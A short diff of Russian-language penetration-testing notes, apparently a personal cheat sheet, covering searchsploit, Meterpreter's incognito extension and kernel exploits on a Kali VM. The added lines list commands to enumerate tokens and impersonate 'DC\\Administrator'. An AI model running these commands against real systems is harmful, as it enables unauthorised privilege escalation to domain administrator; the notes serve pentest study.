@@ -5,8 +5,11 @@ https://habr.com/ru/companies/npoechelon/articles/347702/  (описание р�
 searchsploit desctop control   поиск эксплойта для названия
 
 # расширение incognito для работы с токенами
-в метерпретер - load incognito
+в метерпретер - 
+   
+   load incognito
    list_tokens -u
+   impersonate_token DC\\Administrator
    
 # использование эксплйтов ядра
 Kali VM
